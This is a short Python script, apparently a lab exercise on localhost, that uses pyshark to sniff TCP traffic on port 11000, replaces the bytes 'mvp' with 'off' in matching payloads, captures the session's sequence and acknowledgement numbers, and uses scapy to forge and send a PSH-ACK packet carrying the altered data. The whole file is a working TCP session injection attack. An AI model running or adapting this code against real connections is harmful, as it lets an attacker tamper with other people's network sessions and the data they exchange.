import pyshark
from scapy.all import *
from scapy.layers.inet import IP, TCP
# Specify the network interface to capture traffic on (e.g., 'eth0', 'Wi-Fi', or 'lo')
interface = 'Loopback'  # Replace with your interface name

source_ip = "127.0.0.1"
target_ip = "127.0.0.1"
seq_num = None
ack_num = None
source_port = None
target_port = None
modified_payload = None
# Create a live capture with a display filter
live_capture = pyshark.LiveCapture(interface=interface, display_filter='tcp.port == 11000')
print(f"Listening for packets on {interface}...")

# Process packets in real-time
for packet in live_capture.sniff_continuously():
    try:
        # Extract and decode TCP payload
        print(target_port)
        if 'TCP' in packet and hasattr(packet.tcp, 'payload'):
            raw_payload = packet.tcp.payload  # Raw payload (hex-encoded)
            hex_payload = raw_payload.replace(':', '')
            payload_data = bytes.fromhex(hex_payload)
            #print("origin_hex",payload_data)
            if b"mvp" in payload_data:
                #print("find the original package")
                modified_payload = payload_data.replace(b"mvp", b"off")
                #print("modify_hex",modified_payload)
                source_port = packet.tcp.srcport
                target_port = packet.tcp.dstport
                print("s_port,t_port",source_port,target_port)
        elif 'TCP' in packet and hasattr(packet.tcp, 'flags_ack') and packet.tcp.dstport == target_port:
            seq_num = packet.tcp.seq_raw
            ack_num = packet.tcp.ack_raw
            print("seq_num,ack_num", seq_num, ack_num)

        if seq_num and ack_num:
            seq_num = int(str(seq_num))
            ack_num = int(str(ack_num))
            source_port = int(str(source_port))
            target_port = int(str(target_port))
            # Construct the packet
            packet = IP(src=source_ip, dst=target_ip) / \
                     TCP(sport=source_port, dport=target_port, flags="PA", seq=seq_num, ack=ack_num) / \
                     modified_payload
            print("got a packet")
            send(packet)
            seq_num = None
            ack_num = None
            source_port = None
            target_port = None


    except Exception as e:
        # Handle decoding errors
        print(f"Packet Number: {packet.number} - Decoding Error: {e}")







